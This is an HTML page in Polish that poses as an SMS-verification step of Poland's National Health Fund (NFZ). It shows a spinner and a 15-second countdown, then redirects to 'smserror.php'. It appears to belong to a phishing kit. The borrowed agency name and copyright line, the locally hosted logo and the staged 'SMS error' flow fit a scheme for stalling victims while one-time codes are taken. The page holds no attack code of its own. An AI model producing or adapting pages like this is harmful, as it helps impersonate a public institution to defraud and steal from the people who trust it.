<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="fav.ico" rel="SHORTCUT ICON" />
    <title>Weryfikacja SMS - NFZ</title>
    <style>
        :root {
            --primary-color: #2e2383;
            --primary-hover: #1a165c;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --light-gray: #e9ecef;
            --border-radius: 8px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        header {
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 1rem;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            padding: 1rem 0;
        }
        
        .logo-container img {
            height: 60px;
            max-width: 100%;
        }
        
        main {
            flex: 1;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem 1rem;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .loading-container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            margin: 0 auto;
            width: 100%;
            max-width: 500px;
            text-align: center;
            padding: 2rem;
        }
        
        .loading-header {
            color: var(--primary-color);
            margin-bottom: 1.5rem;
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .loading-content {
            margin-bottom: 2rem;
        }
        
        .countdown {
            font-size: 2rem;
            font-weight: bold;
            color: var(--primary-color);
            margin: 1rem 0;
        }
        
        .progress-container {
            width: 100%;
            background-color: var(--light-gray);
            border-radius: 20px;
            margin: 2rem 0;
            height: 10px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background-color: var(--primary-color);
            width: 0%;
            transition: width 1s linear;
        }
        
        .loading-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            color: var(--primary-color);
        }
        
        .loading-message {
            margin-bottom: 1rem;
            color: #555;
        }
        
        footer {
            background-color: var(--secondary-color);
            padding: 1rem;
            text-align: center;
            font-size: 0.875rem;
            color: #666;
        }
        
        @media (max-width: 768px) {
            main {
                padding: 1rem;
            }
            
            .loading-container {
                border-radius: 0;
                box-shadow: none;
                padding: 1.5rem;
            }
            
            .loading-header {
                font-size: 1.25rem;
            }
        }
        
        /* Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(46, 35, 131, 0.2);
            border-top: 5px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 1.5rem;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="lgo.png" alt="">
        </div>
    </header>
    
    <main>
        <div class="loading-container">
            <div class="loading-header">
                Weryfikacja SMS w toku
            </div>
            
            <div class="spinner"></div>
            
            <div class="loading-content">
                <p class="loading-message">
                    Trwa przygotowanie wiadomości SMS z kodem weryfikacyjnym.
                    Proszę czekać...
                </p>
                
                <div class="countdown" id="countdown">15</div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <p>
                    Za chwilę nastąpi automatyczne przekierowanie do strony weryfikacji SMS.
                </p>
            </div>
        </div>
    </main>
    
    <footer>
        <p>© 2025 Narodowy Fundusz Zdrowia. Wszelkie prawa zastrzeżone.</p>
    </footer>

    <script>
        // Countdown timer
        let seconds = 15;
        const countdownElement = document.getElementById('countdown');
        const progressBar = document.getElementById('progressBar');
        
        // Update progress bar width (0% to 100% over 15 seconds)
        const progressInterval = setInterval(() => {
            const progress = ((15 - seconds) / 15) * 100;
            progressBar.style.width = `${progress}%`;
        }, 1000);
        
        // Update countdown
        const countdownInterval = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(countdownInterval);
                clearInterval(progressInterval);
                window.location.href = 'smserror.php';
            }
        }, 1000);
        
        // Redirect immediately if JavaScript fails
        setTimeout(() => {
            window.location.href = 'smserror.php';
        }, 15000);
    </script>
</body>
</html>